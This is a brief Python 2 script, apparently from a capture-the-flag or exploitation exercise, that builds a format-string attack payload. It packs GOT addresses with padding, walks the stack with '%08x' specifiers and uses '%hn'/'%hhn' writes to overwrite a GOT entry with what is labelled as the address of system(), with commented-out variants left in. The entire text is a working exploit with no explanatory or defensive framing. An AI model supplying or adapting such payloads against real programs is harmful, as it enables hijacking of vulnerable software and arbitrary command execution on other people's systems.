import struct
got = 0x0804a00c
sys = struct.pack("I",0xb7e63190)
payload = "\x0c\xa0\x04\x08"
payload +="JUNK"
payload +="\x0e\xa0\x04\x08"
#payload +="JUNK"
#payload +="\x0e\xa0\x04\x08"
#payload +="JUNK"
#payload +="\x0f\xa0\x04\x08"
payload += "%08x."*4


payload += "%12640x%hn"
payload += "%342x%hhn"
#payload += "%9893x%hn"
#payload += "%8x%n"
#payload += "%8x%hn"
print payload
